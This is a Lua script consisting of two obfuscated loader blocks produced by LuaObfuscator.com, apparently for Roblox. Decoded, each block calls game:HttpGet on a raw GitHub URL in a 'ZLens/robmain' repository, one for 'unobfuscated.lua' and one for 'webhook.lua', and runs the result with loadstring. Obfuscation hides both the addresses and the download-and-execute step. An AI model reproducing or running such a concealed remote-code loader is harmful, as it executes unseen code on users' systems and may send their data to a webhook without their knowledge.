--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v85=v2(v0(v30,16));if v19 then local v111=v5(v85,v19);v19=nil;return v111;else return v85;end end end);local function v20(v31,v32,v33) if v33 then local v86=0 -0 ;local v87;while true do if (v86==(877 -(282 + (1552 -(892 + 65))))) then v87=(v31/((5 -3)^(v32-(1 -0))))%((4 -2)^(((v33-(620 -(555 + 64))) -(v32-((2222 -1290) -(857 + (136 -62))))) + (569 -(367 + (368 -167))))) ;return v87-(v87%(1066 -(68 + 997))) ;end end else local v88=927 -((564 -(87 + 263)) + 713) ;local v89;while true do if (v88==(1270 -(226 + 1044))) then v89=(8 -(186 -(67 + 113)))^(v32-(1 + 0)) ;return (((v31%(v89 + v89))>=v89) and (1 + 0)) or (0 + 0) ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + 2 + 0 );v18=v18 + (4 -2) ;return (v36 * (189 + 67)) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + (11 -8) );v18=v18 + 4 ;return (v40 * (16778168 -(802 + 150))) + (v39 * ((128432 + 48012) -110908)) + (v38 * (464 -208)) + v37 ;end local function v24() local v41=v23();local v42=v23();local v43=998 -(915 + 82) ;local v44=(v20(v42,439 -(145 + 293) ,450 -((1467 -(630 + 793)) + 386) ) * ((5 -(9 -6))^((7187 -5669) -(998 + 488)))) + v41 ;local v45=v20(v42,13 + 8 ,40 -9 );local v46=((v20(v42,1219 -(1069 + 118) )==(2 -1)) and  -(1 -0)) or (1 + 0) ;if (v45==(0 -0)) then if (v44==(0 -0)) then return v46 * (0 + 0) ;else local v112=0;while true do if (v112==0) then v45=860 -(321 + 493 + 45) ;v43=791 -(368 + 423) ;break;end end end elseif (v45==(6433 -4386)) then return ((v44==((61 -43) -(10 + 8))) and (v46 * ((1 + 0)/(0 -0)))) or (v46 * NaN) ;end return v8(v46,v45-(1465 -(416 + 26)) ) * (v43 + (v44/(((1753 -(760 + 987)) -4)^(23 + 29)))) ;end local function v25(v47) local v48;if  not v47 then local v90=1913 -(1789 + 124) ;while true do if (v90==(766 -(745 + 21))) then v47=v23();if (v47==(0 + 0 + 0)) then return "";end break;end end end v48=v3(v16,v18,(v18 + v47) -(2 -1) );v18=v18 + v47 ;local v49={};for v65=3 -(2 + 0) , #v48 do v49[v65]=v2(v1(v3(v48,v65,v65)));end return v6(v49);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v50=(function() return function(v91,v92,v93,v94,v95,v96,v97,v98) local v91=(function() return 1509 -(663 + 846) ;end)();local v92=(function() return;end)();local v93=(function() return;end)();while true do if (v91== #":") then if (v92== #"<") then v93=(function() return v94()~=0 ;end)();elseif (v92==2) then v93=(function() return v95();end)();elseif (v92== #"nil") then v93=(function() return v96();end)();end v97[v98]=(function() return v93;end)();break;end if (0~=v91) then else local v118=(function() return 0;end)();local v119=(function() return;end)();while true do if (v118==0) then v119=(function() return 0;end)();while true do if (v119~=(0 -0)) then else v92=(function() return v94();end)();v93=(function() return nil;end)();v119=(function() return 1;end)();end if (v119==1) then v91=(function() return  #"]";end)();break;end end break;end end end end return v91,v92,v93,v94,v95,v96,v97,v98;end;end)();local v51=(function() return function(v99,v100,v101) local v102=(function() return 0;end)();local v103=(function() return;end)();while true do if (v102==0) then v103=(function() return 0;end)();while true do if (v103~=0) then else local v124=(function() return 0 -0 ;end)();local v125=(function() return;end)();while true do if (v124==0) then v125=(function() return 0 + 0 ;end)();while true do if (v125~=0) then else v99[v100-#"[" ]=(function() return v101();end)();return v99,v100,v101;end end break;end end end end break;end end end;end)();local v52=(function() return {};end)();local v53=(function() return {};end)();local v54=(function() return {};end)();local v55=(function() return {v52,v53,nil,v54};end)();local v56=(function() return v23();end)();local v57=(function() return {};end)();for v67= #":",v56 do FlatIdent_7FAC9,Type,Cons,v21,v24,v25,v57,v67=(function() return v50(FlatIdent_7FAC9,Type,Cons,v21,v24,v25,v57,v67);end)();end v55[ #"-19"]=(function() return v21();end)();for v68= #">",v23() do local v69=(function() return v21();end)();if (v20(v69, #"~", #" ")~=(0 + 0)) then else local v107=(function() return 0;end)();local v108=(function() return;end)();local v109=(function() return;end)();local v110=(function() return;end)();while true do if (v107~=1) then else local v120=(function() return 0;end)();local v121=(function() return;end)();while true do if (v120~=(396 -(115 + 281))) then else v121=(function() return 0 -0 ;end)();while true do if (v121==(0 + 0)) then local v159=(function() return 0 -0 ;end)();while true do if ((3 -2)~=v159) then else v121=(function() return 1;end)();break;end if (v159~=0) then else v110=(function() return {v22(),v22(),nil,nil};end)();if (v108==(867 -(550 + 317))) then local v183=(function() return 0 -0 ;end)();local v184=(function() return;end)();while true do if (v183==(0 -0)) then v184=(function() return 0 -0 ;end)();while true do if (v184==(285 -(134 + 151))) then v110[ #"asd"]=(function() return v22();end)();v110[ #"0836"]=(function() return v22();end)();break;end end break;end end elseif (v108== #"/") then v110[ #"-19"]=(function() return v23();end)();elseif (v108==(1667 -(970 + 695))) then v110[ #"-19"]=(function() return v23() -((3 -1)^(2006 -(582 + 1408))) ;end)();elseif (v108== #"gha") then local v189=(function() return 0 -0 ;end)();local v190=(function() return;end)();while true do if ((0 -0)~=v189) then else v190=(function() return 0;end)();while true do if (v190==0) then v110[ #"asd"]=(function() return v23() -((7 -5)^(1840 -(1195 + 629))) ;end)();v110[ #"xnxx"]=(function() return v22();end)();break;end end break;end end end v159=(function() return 1 -0 ;end)();end end end if (v121~=(242 -(187 + 54))) then else v107=(function() return 2;end)();break;end end break;end end end if (v107~=0) then else local v122=(function() return 780 -(162 + 618) ;end)();while true do if (v122==0) then v108=(function() return v20(v69,2, #"nil");end)();v109=(function() return v20(v69, #"asd1",6);end)();v122=(function() return 1 + 0 ;end)();end if (v122==(1 + 0)) then v107=(function() return 1 -0 ;end)();break;end end end if (v107==(2 -0)) then if (v20(v109, #"[", #"[")~= #"{") then else v110[2]=(function() return v57[v110[2]];end)();end if (v20(v109,2,2)== #"/") then v110[ #"-19"]=(function() return v57[v110[ #"xnx"]];end)();end v107=(function() return 3;end)();end if ((1 + 2)~=v107) then else if (v20(v109, #"91(", #"91(")== #" ") then v110[ #"asd1"]=(function() return v57[v110[ #"0313"]];end)();end v52[v68]=(function() return v110;end)();break;end end end end for v70= #".",v23() do v53,v70,v28=(function() return v51(v53,v70,v28);end)();end return v55;end local function v29(v59,v60,v61) local v62=v59[(2493 -(564 + 292)) -(1373 + 263) ];local v63=v59[1002 -(451 + 549) ];local v64=v59[1 + 2 ];return function(...) local v71=v62;local v72=v63;local v73=v64;local v74=v27;local v75=1 -0 ;local v76= -(1 -0);local v77={};local v78={...};local v79=v12("#",...) -(1 + 0 + 0) ;local v80={};local v81={};for v104=0 -0 ,v79 do if (v104>=v73) then v77[v104-v73 ]=v78[v104 + 1 ];else v81[v104]=v78[v104 + (1258 -((3143 -2100) + 214)) ];end end local v82=(v79-v73) + (342 -(218 + 123)) ;local v83;local v84;while true do v83=v71[v75];v84=v83[1582 -(1535 + 46) ];if (v84<=7) then if (v84<=(3 + 0)) then if ((v84<=(581 -(361 + 219))) or (164>=2785)) then if ((v84==(320 -(53 + 267))) or (525==2109)) then local v129=0 + (304 -(244 + 60)) ;local v130;while true do if ((560 -(131 + 175 + 196 + 58))==v129) then v130=v83[1 + 1 ];v81[v130]=v81[v130](v13(v81,v130 + (983 -((494 -(41 + 435)) + 964)) ,v76));break;end end else v81[v83[3 -1 ]]=v83[(2974 -(363 + 1141)) -(899 + 568) ];end elseif ((33==33) and (v84>(2 + 0))) then local v133=0 -0 ;local v134;local v135;while true do if ((3054<=4015) and (v133==((1604 -(938 + 63)) -(268 + (1915 -(1183 + 397)))))) then v134=v83[2 + 0 ];v135=v81[v83[129 -(116 + 10) ]];v133=1;end if ((1871<3382) and (v133==(291 -((182 -122) + 230)))) then v81[v134 + (573 -(426 + 113 + 33)) ]=v135;v81[v134]=v135[v83[1 + 3 ]];break;end end else v81[v83[(2583 -(936 + 189)) -(282 + 1174) ]]();end elseif (v84<=(3 + 2)) then if (v84>(815 -(569 + 242))) then v81[v83[5 -3 ]]={};else v81[v83[1 + 1 + 0 ]]=v83[1554 -(1126 + 425) ];end elseif ((1293<=2166) and (v84>(411 -(118 + 287)))) then v81[v83[1026 -(706 + 318) ]]=v61[v83[3]];else local v141=(412 + 839) -(721 + 530) ;local v142;local v143;while true do if (v141==((951 + 321) -(945 + (2301 -(1913 + 62))))) then v81[v142 + (2 -1) ]=v143;v81[v142]=v143[v83[4 + 0 ]];break;end if (v141==((233 + 144) -(142 + 235))) then v142=v83[702 -(271 + 429) ];v143=v81[v83[3 + 0 ]];v141=(2639 -(782 + 356)) -(1408 + 92) ;end end end elseif (v84<=(988 -(553 + 424))) then if ((v84<=((690 + 405) -(461 + 625))) or (2579<123)) then if (v84>(1296 -(993 + 295))) then local v144=0 + 0 ;local v145;local v146;local v147;local v148;while true do if (v144==(1 + 0)) then v76=(v147 + v145) -(1172 -((685 -(176 + 91)) + 753)) ;v148=0 + 0 ;v144=1 + 1 ;end if ((v144==2) or (846>=2368)) then for v177=v145,v76 do v148=v148 + 1 ;v81[v177]=v146[v148];end break;end if (v144==(0 + (0 -0))) then v145=v83[1 + 1 ];v146,v147=v74(v81[v145](v13(v81,v145 + (530 -(406 + 123)) ,v83[1772 -(1749 + 20) ])));v144=4 -3 ;end end else do return;end end elseif (v84>(3 + 7)) then local v149=0 -0 ;local v150;local v151;local v152;local v153;while true do if (v149==(1322 -((2341 -(975 + 117)) + 73))) then v150=v83[1331 -(797 + 532) ];v151,v152=v74(v81[v150](v13(v81,v150 + 1 + 0 ,v83[1148 -(466 + (2554 -(157 + 1718))) ])));v149=1 + 0 ;end if (v149==(4 -2)) then for v180=v150,v76 do v153=v153 + (2 -1) ;v81[v180]=v151[v153];end break;end if (v149==(1901 -(106 + 1794))) then v76=(v152 + v150) -1 ;v153=0 + 0 ;v149=1 + 1 ;end end else v81[v83[2]]={};end elseif (v84<=((31 + 7) -25)) then if (v84==(32 -20)) then do return;end else v81[v83[(2049 -(565 + 1368)) -((15 -11) + 110) ]]=v61[v83[(2248 -(1477 + 184)) -(57 + 527) ]];end elseif (v84==14) then v81[v83[1429 -(41 + 1386) ]]();else local v157=(139 -36) -(17 + 86) ;local v158;while true do if (v157==(0 + 0 + 0)) then v158=v83[3 -(3 -2) ];v81[v158]=v81[v158](v13(v81,v158 + (2 -1) ,v76));break;end end end v75=v75 + (167 -(122 + 44)) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403503Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F5A4C656E732F726F626D61696E2F726566732F68656164732F6D61696E2F756E6F6266757363617465642E6C756100094Q00057Q00120D000100013Q00120D000200023Q002006000200020003001201000400044Q000B000200046Q00013Q00022Q00020001000100012Q000C3Q00017Q00",v9(),...);


local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v81=0;while true do if (v81==0) then v19=v0(v3(v30,1,1));return "";end end else local v82=v2(v0(v30,16));if v19 then local v90=v5(v82,v19);v19=nil;return v90;else return v82;end end end);local function v20(v31,v32,v33) if v33 then local v83=0 -0 ;local v84;while true do if (v83==(0 + 0)) then v84=(v31/((879 -(282 + 595))^(v32-((4 -2) -1))))%((3 -1)^(((v33-(1 + 0)) -(v32-(2 -(1 -0)))) + ((1138 -518) -(555 + 64)))) ;return v84-(v84%(932 -(857 + 74))) ;end end else local v85=(570 -(367 + 201))^(v32-(928 -((564 -(87 + 263)) + 713))) ;return (((v31%(v85 + v85))>=v85) and ((1075 -(892 + 65)) -(32 + 85))) or (0 + 0) ;end end local function v21() local v34=0;local v35;while true do if (v34==(181 -(67 + 113))) then return v35;end if (v34==0) then v35=v1(v16,v18,v18);v18=v18 + 1 + 0 + 0 ;v34=2 -(3 -2) ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + (954 -(802 + 150)) );v18=v18 + (5 -3) ;return (v37 * 256) + v36 ;end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (5 -2) );v18=v18 + 3 + 1 ;return (v41 * 16777216) + (v40 * (66533 -(915 + 82))) + (v39 * 256) + v38 ;end local function v24() local v42=v23();local v43=v23();local v44=(6 -4) -1 ;local v45=(v20(v43,439 -(145 + 293) ,450 -(44 + 386) ) * ((2 + 0)^(41 -(42 -33)))) + v42 ;local v46=v20(v43,1208 -(1069 + 118) ,26 + 5 );local v47=((v20(v43,72 -40 )==(1 -0)) and  -(1 + 0)) or (1 -0) ;if (v46==(0 + 0)) then if (v45==(0 -0)) then return v47 * (0 -0) ;else v46=792 -(368 + 423) ;v44=(0 + 0) -0 ;end elseif (v46==((7109 -5044) -(10 + 8))) then return ((v45==(1747 -(760 + 987))) and (v47 * ((3 -2)/(442 -(416 + 26))))) or (v47 * NaN) ;end return v8(v47,v46-(1817 -794) ) * (v44 + (v45/((6 -4)^(23 + 29)))) ;end local function v25(v48) local v49;if  not v48 then local v86=1913 -(1789 + 124) ;while true do if (v86==0) then v48=v23();if (v48==(766 -(745 + 21))) then return "";end break;end end end v49=v3(v16,v18,(v18 + v48) -(1 + 0) );v18=v18 + v48 ;local v50={};for v64=(7 -5) -1 , #v49 do v50[v64]=v2(v1(v3(v49,v64,v64)));end return v6(v50);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v51=(function() return 0 + 0 ;end)();local v52=(function() return;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();while true do local v66=(function() return 0;end)();while true do if (v66~=1) then else if (v51~=2) then else for v98= #"{",v23() do local v99=(function() return 1171 -(418 + 753) ;end)();local v100=(function() return;end)();local v101=(function() return;end)();while true do if ((1 + 0)~=v99) then else while true do if (v100==(0 -0)) then v101=(function() return v21();end)();if (v20(v101, #"{", #",")~=(0 -0)) then else local v152=(function() return 0 + 0 ;end)();local v153=(function() return;end)();local v154=(function() return;end)();local v155=(function() return;end)();local v156=(function() return;end)();while true do if (v152==2) then while true do if ((1 + 1)==v153) then local v161=(function() return 0;end)();local v162=(function() return;end)();while true do if (v161==(0 + 0)) then v162=(function() return 0 + 0 ;end)();while true do if (v162==1) then v153=(function() return  #"91(";end)();break;end if (v162~=0) then else if (v20(v155, #":", #"}")== #">") then v156[1638 -(1373 + 263) ]=(function() return v57[v156[1771 -(1749 + 20) ]];end)();end if (v20(v155,1 + 1 ,2)~= #"~") then else v156[ #"xxx"]=(function() return v57[v156[ #"nil"]];end)();end v162=(function() return 1001 -(451 + 549) ;end)();end end break;end end end if ( #"asd"==v153) then if (v20(v155, #"19(", #"asd")== #"~") then v156[ #"0836"]=(function() return v57[v156[ #"http"]];end)();end v52[v98]=(function() return v156;end)();break;end if (v153== #"}") then local v164=(function() return 0;end)();local v165=(function() return;end)();while true do if ((0 + 0)~=v164) then else v165=(function() return 0 -0 ;end)();while true do if (v165==0) then v156=(function() return {v22(),v22(),nil,nil};end)();if (v154==(0 -0)) then local v171=(function() return 0 -0 ;end)();while true do if ((1900 -(106 + 1794))==v171) then v156[ #"xnx"]=(function() return v22();end)();v156[ #"asd1"]=(function() return v22();end)();break;end end elseif (v154== #"[") then v156[ #"19("]=(function() return v23();end)();elseif (v154==2) then v156[ #"nil"]=(function() return v23() -((1 + 1)^16) ;end)();elseif (v154== #"-19") then local v176=(function() return 0 -0 ;end)();local v177=(function() return;end)();while true do if (v176~=(0 -0)) then else v177=(function() return 0 -0 ;end)();while true do if (v177~=0) then else v156[ #"xnx"]=(function() return v23() -((116 -(4 + 110))^(1400 -(746 + 638))) ;end)();v156[ #"asd1"]=(function() return v22();end)();break;end end break;end end end v165=(function() return 1 + 0 ;end)();end if (v165==(1428 -(41 + 1386))) then v153=(function() return 2 -0 ;end)();break;end end break;end end end if (v153~=0) then else local v166=(function() return 103 -(17 + 86) ;end)();local v167=(function() return;end)();while true do if (v166==(341 -(218 + 123))) then v167=(function() return 1581 -(1535 + 46) ;end)();while true do if ((0 + 0)~=v167) then else v154=(function() return v20(v101,1 + 1 , #"91(");end)();v155=(function() return v20(v101, #".dev",6);end)();v167=(function() return 2 -1 ;end)();end if (v167~=(561 -(306 + 254))) then else v153=(function() return  #"[";end)();break;end end break;end end end end break;end if (v152==0) then local v158=(function() return 0;end)();while true do if (v158==(0 + 0)) then v153=(function() return 166 -(122 + 44) ;end)();v154=(function() return nil;end)();v158=(function() return 1 -0 ;end)();end if ((1 -0)==v158) then v152=(function() return 3 -2 ;end)();break;end end end if (v152==(1468 -(899 + 568))) then local v159=(function() return 0 + 0 ;end)();local v160=(function() return;end)();while true do if ((0 -0)~=v159) then else v160=(function() return 0 + 0 ;end)();while true do if (v160==(1 + 0)) then v152=(function() return 605 -(268 + 335) ;end)();break;end if (v160~=(65 -(30 + 35))) then else v155=(function() return nil;end)();v156=(function() return nil;end)();v160=(function() return 291 -(60 + 230) ;end)();end end break;end end end end end break;end end break;end if (v99~=(572 -(426 + 146))) then else local v104=(function() return 0 + 0 ;end)();while true do if ((1456 -(282 + 1174))==v104) then v100=(function() return 811 -(569 + 242) ;end)();v101=(function() return nil;end)();v104=(function() return 2 -1 ;end)();end if (v104==(1 + 0)) then v99=(function() return 2 -1 ;end)();break;end end end end end for v102= #"}",v23() do v53[v102-#"." ]=(function() return v28();end)();end return v55;end break;end if (v66==(580 -(361 + 219))) then if (v51== #"<") then local v95=(function() return 0;end)();local v96=(function() return;end)();while true do if (v95==0) then v96=(function() return 320 -(53 + 267) ;end)();while true do if (v96==(1025 -(706 + 318))) then for v141= #"|",v56 do local v142=(function() return 1251 -(721 + 530) ;end)();local v143=(function() return;end)();local v144=(function() return;end)();while true do if (v142==(1271 -(945 + 326))) then v143=(function() return v21();end)();v144=(function() return nil;end)();v142=(function() return 2 -1 ;end)();end if (v142~=(1 + 0)) then else if (v143== #" ") then v144=(function() return v21()~=0 ;end)();elseif (v143==(702 -(271 + 429))) then v144=(function() return v24();end)();elseif (v143== #"gha") then v144=(function() return v25();end)();end v57[v141]=(function() return v144;end)();break;end end end v55[ #"nil"]=(function() return v21();end)();v96=(function() return 2;end)();end if (v96==(2 + 0)) then v51=(function() return 7 -5 ;end)();break;end if (v96~=(1500 -(1408 + 92))) then else v56=(function() return v23();end)();v57=(function() return {};end)();v96=(function() return 1 + 0 ;end)();end end break;end end end if (v51~=(1086 -(461 + 625))) then else local v97=(function() return 1288 -(993 + 295) ;end)();while true do if ((0 + 0)~=v97) then else v52=(function() return {};end)();v53=(function() return {};end)();v97=(function() return 1;end)();end if (v97==(1 + 0)) then v54=(function() return {};end)();v55=(function() return {v52,v53,nil,v54};end)();v97=(function() return 2 + 0 ;end)();end if (v97==2) then v51=(function() return  #"[";end)();break;end end end v66=(function() return 1;end)();end end end end local function v29(v58,v59,v60) local v61=v58[127 -(116 + 10) ];local v62=v58[1 + 1 ];local v63=v58[741 -(542 + 196) ];return function(...) local v67=v61;local v68=v62;local v69=v63;local v70=v27;local v71=1 -0 ;local v72= -((1934 -(565 + 1368)) + 0);local v73={};local v74={...};local v75=v12("#",...) -(1 + 0) ;local v76={};local v77={};for v87=0 -0 ,v75 do if (v87>=v69) then v73[v87-v69 ]=v74[v87 + 1 ];else v77[v87]=v74[v87 + (2 -1) ];end end local v78=(v75-v69) + 1 ;local v79;local v80;while true do v79=v67[v71];v80=v79[1552 -(1126 + 425) ];if (v80<=(412 -(118 + (1079 -792)))) then if ((4157>1889) and (v80<=(11 -8))) then if (v80<=(1122 -(118 + 1003))) then if (v80==(0 -0)) then v77[v79[379 -(142 + 235) ]]();else v77[v79[9 -7 ]]={};end elseif ((v80==(1 + 1)) or (1912>2982)) then local v106=v79[2];v77[v106]=v77[v106](v13(v77,v106 + (978 -(553 + 424)) ,v72));else v77[v79[3 -1 ]]=v60[v79[3 + 0 ]];end elseif (v80<=(5 + 0)) then if (v80==(3 + 1)) then local v110=v79[1 + 1 ];local v111=v77[v79[2 + 1 ]];v77[v110 + (2 -(1662 -(1477 + 184))) ]=v111;v77[v110]=v111[v79[4]];else v77[v79[2 -0 ]]={};end elseif (v80==((15 + 1) -10)) then do return;end else local v116=v79[2];v77[v116]=v77[v116](v13(v77,v116 + 1 ,v72));end elseif ((647<=3287) and (v80<=(24 -13))) then if (v80<=(3 + 6)) then if (v80>8) then v77[v79[2]]=v79[14 -11 ];else v77[v79[755 -(239 + 514) ]]=v60[v79[2 + 1 ]];end elseif ((v80==(1339 -(797 + 532))) or (2318>=4800)) then v77[v79[(858 -(564 + 292)) + 0 ]]();else local v122=v79[(1 -0) + 1 ];local v123,v124=v70(v77[v122](v13(v77,v122 + (2 -1) ,v79[1205 -(373 + 829) ])));v72=(v124 + v122) -(732 -(476 + 255)) ;local v125=1130 -(369 + 761) ;for v135=v122,v72 do local v136=(0 -0) + 0 ;while true do if (v136==((304 -(244 + 60)) -0)) then v125=v125 + (1 -0) ;v77[v135]=v123[v125];break;end end end end elseif ((v80<=(251 -(64 + 174))) or (142>=4749)) then if (v80==(2 + 10)) then local v126=v79[2];local v127,v128=v70(v77[v126](v13(v77,v126 + (1 -0) ,v79[339 -(144 + 192) ])));v72=(v128 + v126) -(217 -(42 + 174)) ;local v129=0 + 0 ;for v137=v126,v72 do v129=v129 + 1 ;v77[v137]=v127[v129];end else v77[v79[2 + 0 ]]=v79[2 + 1 + 0 ];end elseif (v80>14) then do return;end else local v132=(1980 -(41 + 435)) -(363 + 1141) ;local v133;local v134;while true do if (v132==((2581 -(938 + 63)) -(1183 + 397))) then v133=v79[5 -3 ];v134=v77[v79[3 + 0 ]];v132=1 + 0 ;end if ((3926<=4134) and (v132==(1976 -(1913 + 62)))) then v77[v133 + 1 + 0 ]=v134;v77[v133]=v134[v79[10 -6 ]];break;end end end v71=v71 + 1 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574034B3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F5A4C656E732F726F626D61696E2F726566732F68656164732F6D61696E2F776562682Q6F6B2E6C756100094Q00017Q001203000100013Q001203000200023Q00200400020002000300120D000400044Q000C000200044Q000700013Q00022Q000A0001000100012Q00063Q00017Q00",v9(),...);
        
